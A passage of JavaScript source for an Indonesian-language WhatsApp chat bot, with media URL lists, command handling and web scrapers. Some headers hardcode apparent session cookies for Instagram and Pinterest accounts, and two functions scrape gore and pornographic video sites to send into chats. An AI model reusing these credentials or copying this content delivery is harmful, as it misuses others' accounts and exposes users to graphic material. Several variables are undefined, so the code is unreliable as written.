"https://telegra.ph/file/098c091633b189ab0d608.mp4",
"https://telegra.ph/file/11733a96997eb136d3238.mp4",
"https://telegra.ph/file/d17ee330d77651d22e12c.mp4",
"https://telegra.ph/file/72398a32a3adfb439c789.mp4",
"https://telegra.ph/file/034b49f8b7c544b6ab6a4.mp4",
"https://telegra.ph/file/ad82a256fb0aa6642bfae.mp4",
"https://telegra.ph/file/0411d8d5cbb090606f3a0.mp4",
"https://telegra.ph/file/b67fc75a65006fd2c52c7.mp4",
"https://telegra.ph/file/3ac2dda896291c61c7606.mp4",
"https://telegra.ph/file/d8dd9e06d8e93bf0f2a18.mp4",
"https://telegra.ph/file/03de1cdfc24fc656862da.mp4",
"https://telegra.ph/file/490b3a28ef1837b9f04ba.mp4",
"https://telegra.ph/file/8b4e228df25da459d6b6c.mp4",
"https://telegra.ph/file/b559faa36c6174b35e2f9.mp4",
"https://telegra.ph/file/de53ae15b5966e6faa75e.mp4",
"https://telegra.ph/file/e56a8405ee21eb68d4dc3.mp4",
"https://telegra.ph/file/2af8a8c7cfe122da9c5c4.mp4",
"https://telegra.ph/file/03b5b613979fc327e17ad.mp4",
"https://telegra.ph/file/ad2e2718406c3510c890f.mp4",
"https://telegra.ph/file/238d7fc14cce80f7701e7.mp4",
"https://telegra.ph/file/5391e5bbf0e350ca12567.mp4",
"https://telegra.ph/file/37f76d7005ede30e9a9ce.mp4",
"https://telegra.ph/file/3aa310ece5fb1995b642b.mp4",
"https://telegra.ph/file/32246971975fb3620e95e.mp4",
"https://telegra.ph/file/3c52f7f3b1c1ab69ea4d8.mp4",
"https://telegra.ph/file/6305aad0fb91bdd73cedd.mp4",
"https://telegra.ph/file/e03934008745fb7e87e9c.mp4",
"https://telegra.ph/file/cd93ab5e9a919da5151ba.mp4",
"https://telegra.ph/file/08ea3cc3e83733d9e54d3.mp4",
"https://telegra.ph/file/0369bed3a447539864b0c.mp4",
"https://telegra.ph/file/48da5cd44ec67d62838ba.mp4",
"https://telegra.ph/file/8f97dd4916932a3ad69cc.mp4",
"https://telegra.ph/file/ba8fcec5fed355b6f02a6.mp4",
"https://telegra.ph/file/e9d26018801b9edf68e16.mp4",
"https://telegra.ph/file/b4f8fe1c448cf9975e8a4.mp4",
"https://telegra.ph/file/a219353745d416c18e3c5.mp4",
"https://telegra.ph/file/9be642aa5a7ea91b04016.mp4",
"https://telegra.ph/file/f6922169933548f2cdbca.mp4",
"https://telegra.ph/file/b7e9c06dd664803720e74.mp4",
"https://telegra.ph/file/ed89e6c2558865eb119e9.mp4",
"https://telegra.ph/file/f94536728b19d12f92f63.mp4",
"https://telegra.ph/file/0239612caddb9b5776b99.mp4",
"https://telegra.ph/file/068af625aecdaf0bd1b19.mp4",
"https://telegra.ph/file/c92aed0b5fd34842e0912.mp4",
"https://telegra.ph/file/f25df94b424f0980eeae1.mp4",
"https://telegra.ph/file/960f340700ba4d5704b88.mp4",
"https://telegra.ph/file/b051d04f6c9ab4e250bb5.mp4",
"https://telegra.ph/file/b71262885502a56e750ee.mp4",
"https://telegra.ph/file/c5838ed42d4c5b08930cc.mp4",
"https://telegra.ph/file/e3ebb5eb9f1027be39b17.mp4",
"https://telegra.ph/file/86349446527f1004b1209.mp4",
"https://telegra.ph/file/4b484228485890759c3b8.mp4",
"https://telegra.ph/file/ef1add1d4d23b41ab39e8.mp4",
"https://telegra.ph/file/422f2827750b777b04294.mp4",
"https://telegra.ph/file/80958f7f4622fada76f2f.mp4",
"https://telegra.ph/file/7cec2db420ea313e4d0fa.mp4",
"https://telegra.ph/file/9eea7a2b9011cc29cee9c.mp4",
"https://telegra.ph/file/4422cac47d0fc0a54ad4a.mp4",
"https://telegra.ph/file/765e1b21587b3f7499d2e.mp4",
"https://telegra.ph/file/5652f42312d2c8f94174b.mp4",
"https://telegra.ph/file/afce58f450d736616bc2c.mp4",
"https://telegra.ph/file/a73f394eead8d31153857.mp4",
"https://telegra.ph/file/f8311147059112e8d8a08.mp4",
"https://telegra.ph/file/e8257b01dda21c92cb9a4.mp4",
"https://telegra.ph/file/e5a5b1e29385379b79f16.mp4",
"https://telegra.ph/file/4dc8d3af95963b57f44e9.mp4",
"https://telegra.ph/file/fd9988ab62be9acc04792.mp4",
"https://telegra.ph/file/dae7f49edce41ee869930.mp4",
"https://telegra.ph/file/b9dfda193baaf1713b2be.mp4",
"https://telegra.ph/file/46f23cb5c3f3488a9e85a.mp4",
"https://telegra.ph/file/ac326fbb1387ffa612c1d.mp4",
"https://telegra.ph/file/aaa984a56ef8503f4b7b5.mp4",
"https://telegra.ph/file/ade72543ef0c1a038f888.mp4",
"https://telegra.ph/file/dba53ddc207099fd74a8d.mp4",
"https://telegra.ph/file/59d1bd8fd1f5fdcd9cf03.mp4",
"https://telegra.ph/file/70535391c74acafc77ab4.mp4",
"https://telegra.ph/file/a7bd1a9ff31c6d8e81fd9.mp4",
"https://telegra.ph/file/c7bb637795183f8d68d3f.mp4",
"https://telegra.ph/file/bf1f33f203d86481b812e.mp4",
"https://telegra.ph/file/5bf20d021507a4a77cc4a.mp4",
"https://telegra.ph/file/9b9e007d2d76355dfb258.mp4",
"https://telegra.ph/file/faa51056e88d03a99504d.mp4",
"https://telegra.ph/file/b6883fcb9419c278d1f99.mp4",
"https://telegra.ph/file/971ebfad6cd4a645ee435.mp4",
"https://telegra.ph/file/56476c68a1ef818f65df9.mp4",
"https://telegra.ph/file/284f80d4f17ba29b33fb0.mp4",
"https://telegra.ph/file/4c72f9a04b7656cacc2c6.mp4",
"https://telegra.ph/file/6b870e1766879794e51bc.mp4",
"https://telegra.ph/file/ae911d5cddfcf451f2b7d.mp4",
"https://telegra.ph/file/f1cd2852dd97a47deb1a7.mp4",
"https://telegra.ph/file/fcbb7d87b86b7800684cb.mp4",
"https://telegra.ph/file/1f287ec0397ca945f2253.mp4",
"https://telegra.ph/file/ca43b6fedc3586b6fa521.mp4",
"https://telegra.ph/file/61d6be11819c92c02d03f.mp4",
"https://telegra.ph/file/4d3ebad1e26e3a6e86aae.mp4",
"https://telegra.ph/file/16cd076690c4e38fa2c77.mp4",
"https://telegra.ph/file/5d20854afb1b5550d07ef.mp4",
"https://telegra.ph/file/0d09e729581fa7e2ae1dd.mp4",
"https://telegra.ph/file/8d8e25cec5a9ebc9b3046.mp4",
"https://telegra.ph/file/0b49555bfb44740efb32e.mp4",
"https://telegra.ph/file/f2ee8844842e266c938a0.mp4",
"https://telegra.ph/file/67e4b254bb454097040de.mp4",
"https://telegra.ph/file/86e90dbe0ae0e4267573e.mp4",
"https://telegra.ph/file/f18ce0a167d37fb3bcbe2.mp4",
"https://telegra.ph/file/8948bb332b2171f93a8ad.mp4",
"https://telegra.ph/file/112b88811b43e5837e13f.mp4",
"https://telegra.ph/file/915bfce39f929ae350b6a.mp4",
"https://telegra.ph/file/017475fc15cfac22fae5f.mp4",
"https://telegra.ph/file/1a16152a1ab0168d194db.mp4",
"https://telegra.ph/file/005d80e53378020a1bd3c.mp4",
"https://telegra.ph/file/eae14f005f736e4051b38.mp4",
"https://telegra.ph/file/0c42a45b6bef1d6c6981a.mp4",
"https://telegra.ph/file/80346e8482ee580ee82ae.mp4",
"https://telegra.ph/file/6eaafc3a71db0c03aae66.mp4",
"https://telegra.ph/file/aedf6e21a6bbecf2e535f.mp4",
"https://telegra.ph/file/f384e9416e71a9d404a5b.mp4",
"https://telegra.ph/file/900a1ea063493337d0fd7.mp4",
"https://telegra.ph/file/ce4af384afc08f598cc49.mp4",
"https://telegra.ph/file/b3765a534396c6588191c.mp4",
"https://telegra.ph/file/244ba89613e8db7852c5f.mp4",
"https://telegra.ph/file/0df27d63cd200c7952c7d.mp4",
"https://telegra.ph/file/af63ac9b9707d7169a127.mp4",
"https://telegra.ph/file/2f871f7a86bb1c62b2fda.mp4",
"https://telegra.ph/file/273b1ee594230a7832300.mp4",
"https://telegra.ph/file/f9d73d1151d2fb2e597d7.mp4",
"https://telegra.ph/file/2cdb650c8060a71158590.mp4",
"https://telegra.ph/file/45f4f6a23e1c6079a71fd.mp4",
"https://telegra.ph/file/eb1adab8eb1a96e1014c5.mp4",
"https://telegra.ph/file/793d48c6966b5820683ea.mp4",
"https://telegra.ph/file/9cb3a357b55d5d72a46a6.mp4",
"https://telegra.ph/file/e54322fc26182754ac2cb.mp4",
"https://telegra.ph/file/2f871f7a86bb1c62b2fda.mp4",
"https://telegra.ph/file/d219599ffceb3fd693ce7.mp4",
"https://telegra.ph/file/a5324fd4df79d322c6387.mp4",
"https://telegra.ph/file/a3c978e703b5370b59d4e.mp4",
"https://telegra.ph/file/95986a1e8e7277e31c0e6.mp4",
"https://telegra.ph/file/ed7a1d551597e4d2493fd.mp4",
"https://telegra.ph/file/8ce26c302fd05602fa35c.mp4",
"https://telegra.ph/file/a365cba57b1793a8b4197.mp4",
"https://telegra.ph/file/eb3535615d6d4817be8b4.mp4",
"https://telegra.ph/file/dfd46e01da64343cee6f4.mp4",
"https://telegra.ph/file/3235a0b804616e6df5e7d.mp4",
"https://telegra.ph/file/56fc804aa3388f5943195.mp4"

]
module.exports = miku = async (miku, m, chatUpdate, store) => {
    try {
	const { type, isGroupMsg, caption, quotedMsg, quotedMsgObj, id,  } = store
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        
    const chats = (type === 'chat') ? body : (type === 'image' || type === 'video') ? caption : (type == 'buttons_response') ? message.selectedButtonId: ''
		        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = miku.user.id ? miku.user.id.split(":")[0]+"@s.whatsapp.net" : miku.user.id
        const fromMe = m.key.fromMe
        const from = m.key.remoteJid
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const arg = budy.slice(command.length + 2, budy.length)
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
	    const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    const isNumber = x => typeof x === 'number' && !isNaN(x)
	    
        // Group
        const isGroup = m.chat.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await miku.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const sender = isGroup ? mek.participant : mek.key.remoteJid
        // Bot Status
const reply = (teks, men) => {
             return miku.sendMessage(from, { text: teks, mentions: men ? men : [] }, { quoted: m })
        }
if (!isGroup && !isCmd && !itsMe && !isMedia) { 
try{
miku.sendPresenceUpdate('composing', from)
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`, {methods: "GET"})
let sami = simi.success  
m.reply(`${sami}`)
} catch (err){
console.log(err)
m.reply("Chika gatau mau ngomong apa")
}
} 

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return m.reply(`Command *${command}* telah di block oleh system karena terjadi error`)
} else{
return m.reply(`Maaf kak command *${command}* telah di block oleh owner`)
}
}
}
/*const sendFile = async (from, url, caption, m, men) => {
let mime = '';
let res = await axios.head(url)
mime = res.headers['content-type']
if (mime.split("/")[1] === "gif") {
return miku.sendMessage(from, { video: await convertGif(url), caption: caption, gifPlayback: true, mentions: men ? men : []}, {quoted: m})
}
let type = mime.split("/")[0]+"Message"
if(mime.split("/")[0] === "image"){
return miku.sendMessage(from, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
} else if(mime.split("/")[0] === "video"){
return miku.sendMessage(from, { video: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
} else if(mime.split("/")[0] === "audio"){
return miku.sendMessage(from, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
} else {
return miku.sendMessage(from, { document: await getBuffer(url), mimetype: mime, caption: caption, mentions: men ? men : []}, {quoted: m })
}
}*/

const textImg = (teks, buffer = fs.readFileSync('./lib/assets/Miku.jpg'), mess, men) => {
             return miku.sendMessage(from, { text: teks, jpegThumbnail: buffer, mention: men ? men : [] }, { quoted: mess ? mess : m })
        }
        const sendMess = (from, teks) => {
             return miku.sendMessage(from, { text: teks })
        }
        const used = process.memoryUsage()
        const cpus = os.cpus().map(cpu => {
            cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			return cpu
        })
        const cpu = cpus.reduce((last, cpu, _, { length }) => {
            last.total += cpu.total
			last.speed += cpu.speed / length
			last.times.user += cpu.times.user
			last.times.nice += cpu.times.nice
			last.times.sys += cpu.times.sys
			last.times.idle += cpu.times.idle
			last.times.irq += cpu.times.irq
			return last
        }, {
            speed: 0,
			total: 0,
			times: {
			    user: 0,
			    nice: 0,
			    sys: 0,
			    idle: 0,
			    irq: 0
            }
        })

        // respon
        for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					m.reply(commandsDB[i].balasan)
				}
			}
const detect = (teks) => { 
miku.sendMessage(from, { text : teks, contextInfo: {"externalAdReply": { title: `Akurasi : ${anu2}`,mediaType: 3,renderLargerThumbnail: true, showAdAttribution: true, body: "Command Not Found",thumbnail: global.thumb,sourceUrl: "https://www.instagram.com/p/CdE0RPbDRXi/?igshid=YmMyMTA2M2Y="}}})
}
async function igDownloader(Link) {
	const hasil = []
	const Form = {
		url: Link,
		submit: ""
	}
	await axios(`https://downloadgram.org/`, {
		method: "POST",
		data:  new URLSearchParams(Object.entries(Form)),
		headers: {
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-language": "en-US,en;q=0.9,id;q=0.8",
			"cache-control": "max-age=0",
			"content-type": "application/x-www-form-urlencoded",
			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
			"cookie": "_ga=GA1.2.1695343126.1621491858; _gid=GA1.2.28178724.1621491859; __gads=ID=8f9d3ef930e9a07b-2258e672bec80081:T=1621491859:RT=1621491859:S=ALNI_MbqLxhztDiYZttJFX2SkvYei6uGOw; __atuvc=3%7C20; __atuvs=60a6eb107a17dd75000; __atssc=google%3B2; _gat_gtag_UA_142480840_1=1"
		},
		referrerPolicy: "strict-origin-when-cross-origin",
	}).then(async res => {
		const $ = cheerio.load(res.data)
		let url = $('#downloadBox').find('a').attr('href');
		await axios(Link, {
			method: "GET",
			data: null,
			headers: {
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"accept-language": "en-US,en;q=0.9,id;q=0.8",
				"cache-control": "max-age=0",
				"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
				"cookie": "ig_did=08A3C465-7D43-4D8A-806A-88F98384E63B; ig_nrcb=1; mid=X_ipMwALAAFgQ7AftbrkhIDIdXJ8; fbm_124024574287414=base_domain=.instagram.com; shbid=17905; ds_user_id=14221286336; csrftoken=fXHAj5U3mcJihQEyVXfyCzcg46lHx7QD; sessionid=14221286336%3A5n4czHpQ0GRzlq%3A28; shbts=1621491639.7673564; rur=FTW"
			},
			referrerPolicy: "strict-origin-when-cross-origin"
		}).then(respon => {
			const ch = cheerio.load(respon.data)
			let title = ch('title').text().trim()
			const result = {
				status: true,
				result: {
					link: url,
					desc: title
				}
			}
			hasil.push(result)
		})
	})
	return hasil[0]
}
async function pixivDl(query) {
	if (query.match(URL_REGEX)) {
		if (!/https:\/\/www.pixiv.net\/en\/artworks\/[0-9]+/i.test(query)) throw 'Invalid Pixiv Url'
		query = query.replace(/\D/g, '')
		let res = await pixiv.getIllustByID(query).catch(() => null)
		if (!res) throw `ID "${query}" not found :/`
		let media = []
		for (let x = 0; x < res.urls.length; x++) media.push(await pixiv.download(new URL(res.urls[x].original)))
		return {
			artist: res.user.name, caption: res.title, tags: res.tags.tags.map(v => v.tag), media
		}
	} else {
		let res = await pixiv.getIllustsByTag(query)
		if (!res.length) throw `Tag's "${query}" not found :/`
		res = res[~~(Math.random() * res.length)].id
		res = await pixiv.getIllustByID(res)
		let media = []
		for (let x = 0; x < res.urls.length; x++) media.push(await pixiv.download(new URL(res.urls[x].original)))
		return {
			artist: res.user.name, caption: res.title, tags: res.tags.tags.map(v => v.tag), media
		}
	}
}
function randomgore() {
  return new Promise(async (resolve, reject) => {
    rand = Math.floor(Math.random() * 218) + 1
    randvid = Math.floor(Math.random() * 16) + 1
    if (rand === 1) {
      slink = 'https://seegore.com/gore/'
    } else {
      slink = `https://seegore.com/gore/page/${rand}/`
    }
    axios.get(slink).then(({ data }) => {
      const $ = cheerio.load(data)
      const link = []
      const result = []
      const username = []
      const linkp = $(`#post-items > li:nth-child(${randvid}) > article > div.post-thumbnail > a`).attr('href')
      const thumbb = $(`#post-items > li:nth-child(${randvid}) > article > div.post-thumbnail > a > div > img`).attr('src')
      axios
        .get(linkp)
        .then(({ data }) => {
          const $$ = cheerio.load(data)
          const format = {
            judul: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > header > h1').text(),
            views: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > span > span.count').text(),
            comment: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > a > span.count').text() == '' ? 'Tidak ada komentar' : $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > a > span.count').text(),
            thumb: thumbb,
            link: $$('video > source').attr('src'),
          }
          const result = {
            creator: 'Zynfx',
            data: format,
          }
          resolve(result)
        })
        .catch(reject)
    })
  })
}
function hentaivid() {
 return new Promise((resolve, reject) => {
 const page = Math.floor(Math.random() * 1153)
 axios.get('https://sfmcompile.club/page/'+page)
 .then((data) => {
 const $ = cheerio.load(data.data)
 const hasil = []
 $('#primary > div > div > ul > li > article').each(function (a, b) {
 hasil.push({
 title: $(b).find('header > h2').text(),
 link: $(b).find('header > h2 > a').attr('href'),
 category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
 share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
 views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
 type: $(b).find('source').attr('type') || 'image/jpeg',
 video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
 video_2: $(b).find('video > a').attr('href') || ''
 })
 })
 const random = hasil[Math.floor(Math.random() * hasil.length)]
 resolve({
 status: data.status,
 creator: 'Zynfx',
 hasil: random
 })
 })
 })
}
function titidDown(Url) {
		return new Promise (async (resolve, reject) => {
		await axios.request({
			url: "https://ttdownloader.com/",
			method: "GET",
			headers: {
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"accept-language": "en-US,en;q=0.9,id;q=0.8",
				"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
				"cookie": "_ga=GA1.2.1240046717.1620835673; PHPSESSID=i14curq5t8omcljj1hlle52762; popCookie=1; _gid=GA1.2.1936694796.1623913934"
			}
		}).then(respon => {
			const $ = cheerio.load(respon.data)
			const token = $('#token').attr('value')
			axios({
				url: "https://ttdownloader.com/req/",
				method: "POST",
				data: new URLSearchParams(Object.entries({url: Url, format: "", token: token})),
				headers: {
					"accept": "*/*",
					"accept-language": "en-US,en;q=0.9,id;q=0.8",
					"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
					"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
					"cookie": "_ga=GA1.2.1240046717.1620835673; PHPSESSID=i14curq5t8omcljj1hlle52762; popCookie=1; _gid=GA1.2.1936694796.1623913934"
				}
			}).then(res => {
				const ch = cheerio.load(res.data)
				const result = {
					status: res.status,
					result: {
						wm: ch('#results-list > div:nth-child(3)').find('div.download > a').attr('href'),
						nowm: ch('#results-list > div:nth-child(2)').find('div.download > a').attr('href')
						}
				}
				resolve(result)
			}).catch(reject)
		}).catch(reject)
	})

}

function isUrl(url){
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
function pinterest(querry){
	return new Promise(async(resolve,reject) => {
		 axios.get('https://id.pinterest.com/search/pins/?autologin=true&q=' + querry, {
			headers: {
			"cookie" : "_auth=1; _b=\"AVna7S1p7l1C5I9u0+nR3YzijpvXOPc6d09SyCzO+DcwpersQH36SmGiYfymBKhZcGg=\"; _pinterest_sess=TWc9PSZHamJOZ0JobUFiSEpSN3Z4a2NsMk9wZ3gxL1NSc2k2NkFLaUw5bVY5cXR5alZHR0gxY2h2MVZDZlNQalNpUUJFRVR5L3NlYy9JZkthekp3bHo5bXFuaFZzVHJFMnkrR3lTbm56U3YvQXBBTW96VUgzVUhuK1Z4VURGKzczUi9hNHdDeTJ5Y2pBTmxhc2owZ2hkSGlDemtUSnYvVXh5dDNkaDN3TjZCTk8ycTdHRHVsOFg2b2NQWCtpOWxqeDNjNkk3cS85MkhhSklSb0hwTnZvZVFyZmJEUllwbG9UVnpCYVNTRzZxOXNJcmduOVc4aURtM3NtRFo3STlmWjJvSjlWTU5ITzg0VUg1NGhOTEZzME9SNFNhVWJRWjRJK3pGMFA4Q3UvcHBnWHdaYXZpa2FUNkx6Z3RNQjEzTFJEOHZoaHRvazc1c1UrYlRuUmdKcDg3ZEY4cjNtZlBLRTRBZjNYK0lPTXZJTzQ5dU8ybDdVS015bWJKT0tjTWYyRlBzclpiamdsNmtpeUZnRjlwVGJXUmdOMXdTUkFHRWloVjBMR0JlTE5YcmhxVHdoNzFHbDZ0YmFHZ1VLQXU1QnpkM1FqUTNMTnhYb3VKeDVGbnhNSkdkNXFSMXQybjRGL3pyZXRLR0ZTc0xHZ0JvbTJCNnAzQzE0cW1WTndIK0trY05HV1gxS09NRktadnFCSDR2YzBoWmRiUGZiWXFQNjcwWmZhaDZQRm1UbzNxc21pV1p5WDlabm1UWGQzanc1SGlrZXB1bDVDWXQvUis3elN2SVFDbm1DSVE5Z0d4YW1sa2hsSkZJb1h0MTFpck5BdDR0d0lZOW1Pa2RDVzNySWpXWmUwOUFhQmFSVUpaOFQ3WlhOQldNMkExeDIvMjZHeXdnNjdMYWdiQUhUSEFBUlhUVTdBMThRRmh1ekJMYWZ2YTJkNlg0cmFCdnU2WEpwcXlPOVZYcGNhNkZDd051S3lGZmo0eHV0ZE42NW8xRm5aRWpoQnNKNnNlSGFad1MzOHNkdWtER0xQTFN5Z3lmRERsZnZWWE5CZEJneVRlMDd2VmNPMjloK0g5eCswZUVJTS9CRkFweHc5RUh6K1JocGN6clc1JmZtL3JhRE1sc0NMTFlpMVErRGtPcllvTGdldz0=; _ir=0"
		}
			}).then(({ data }) => {
		const $ = cheerio.load(data)
		const result = [];
		const hasil = [];
   		 $('div > a').get().map(b => {
        const link = $(b).find('img').attr('src')
            result.push(link)
		});
   		result.forEach(v => {
		 if(v == undefined) return
		 hasil.push(v.replace(/236/g,'736'))
			})
			hasil.shift();
		resolve(hasil)
		})
	})
}

// MediaFire
async function mediafire(url) {
let query = await axios.get(url) 
let cher = cheerio.load(query.data)
let hasil = []
let link = cher('a#downloadButton').attr('href')
let size = cher('a#downloadButton').text().replace('Download', '').replace('(', '').replace(')', '').replace('\n', '').replace('\n', '').replace(' ', '')
let seplit = link.split('/')
let name = seplit[5]
let mime = name.split('.')
mime = mime[1]
hasil.push({ author, name, mime, size, link })
return hasil
}

async function aiovideodl(link) {
return new Promise((resolve, reject) => {
axios({
url: 'https://aiovideodl.ml/',
method: 'GET',
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
"cookie": "PHPSESSID=69ce1f8034b1567b99297eee2396c308; _ga=GA1.2.1360894709.1632723147; _gid=GA1.2.1782417082.1635161653"
}
}).then((src) => {
let a = cheerio.load(src.data)
let token = a('#token').attr('value')
axios({
url: 'https://aiovideodl.ml/wp-json/aio-dl/video-data/',
method: 'POST',
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
"cookie": "PHPSESSID=69ce1f8034b1567b99297eee2396c308; _ga=GA1.2.1360894709.1632723147; _gid=GA1.2.1782417082.1635161653"   
},
data: new URLSearchParams(Object.entries({ 'url': link, 'token': token }))
}).then(({ data }) => {
resolve(data)
})
})
})
}

async function apkDl(url) {
	let res = await fetch('https://apk.support/gapi/index.php', {
		method: 'post',
		body: new URLSearchParams(Object.entries({ x: 'downapk', t: 1, google_id: url, device_id: '', language: 'en-US', dpi: 480, gl: 'SUQ=', model: '', hl: 'en', de_av: '', aav: '', android_ver: 5.1, tbi: 'arm64-v8a', country: 0, gc: undefined }))
	})
	let $ = cheerio.load(await res.text())
	let fileName = $('div.browser > div.dvContents > ul > li > a').text().trim().split(' ')[0]
	let download = $('div.browser > div.dvContents > ul > li > a').attr('href')
	if (!download) throw 'Can\'t download the apk!'
	let mimetype = (await fetch(download, { method: 'head' })).headers.get('content-type')
	return { fileName, mimetype, download }
}

async function getInfo(url) {
	// url = (await fetch(url)).url
	let id = url.split('?')[0].split('/')
	let res = await (await fetch(`https://www.tiktok.com/node/share/video/${id[3]}/${id[5]}/`)).json()
	return res?.seoProps?.metaParams
}

async function shortUrl(url) {
	return await (await fetch(`https://tinyurl.com/api-create.php?url=${url}`)).text()
}
async function sfileSearch(query, page = 1) {
	let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
	let $ = cheerio.load(await res.text())
	let result = []
	$('div.list').each(function () {
		let title = $(this).find('a').text()
		let size = $(this).text().trim().split('(')[1]
		let link = $(this).find('a').attr('href')
		if (link) result.push({ title, size: size.replace(')', ''), link })
	})
	return result
}
const gempa = async () => {
return new Promise((resolve, reject) => {
axios.get('https://www.bmkg.go.id/gempabumi/gempabumi-dirasakan.bmkg').then((response) => {
const $ = cheerio.load(response.data)
const urlElems = $('table.table-hover.table-striped')
for (let i = 0; i < urlElems.length; i++) {
const urlSpan = $(urlElems[i]).find('tbody')[0]
if (urlSpan) {
const urlData = $(urlSpan).find('tr')[0]
var Kapan = $(urlData).find('td')[1]
var Letak = $(urlData).find('td')[2]
var Magnitudo = $(urlData).find('td')[3]
var Kedalaman = $(urlData).find('td')[4]
var Wilayah = $(urlData).find('td')[5]
var lintang = $(Letak).text().split(' ')[0]
var bujur = $(Letak).text().split(' ')[2]
var hasil = {
Waktu: $(Kapan).text(),
Lintang: lintang,
Bujur: bujur,
Magnitudo: $(Magnitudo).text(),
Kedalaman: $(Kedalaman).text().replace(/\t/g, '').replace(/I/g, ''),
Wilayah: $(Wilayah).text().replace(/\t/g, '').replace(/I/g, '').replace('-','').replace(/\r/g, '').split('\n')[0],
Map: $('div.row > div > img').attr('src')
}
resolve(hasil);
console.log(hasil)
}
}
})
})
}

async function jadwalsholat(query) {
	let id = await (await fetch(`https://api.myquran.com/v1/sholat/kota/cari/${query}`)).json()
	if (id.status !== true) throw id.message
	id = id.data
	let result = [], d = new Date().toLocaleDateString('id', { timeZone: 'Asia/Jakarta' }).split('/')
	for (let i = 0; i < id.length; i++) {
		let res = await fetch(`https://api.myquran.com/v1/sholat/jadwal/${id[i].id}/${d[2]}/${d[1]}/${d[0]}`)
		res = await res.json()
		result.push({ lokasi: res.data.lokasi, daerah: res.data.daerah, jadwal: res.data.jadwal })
	}
	return result
}
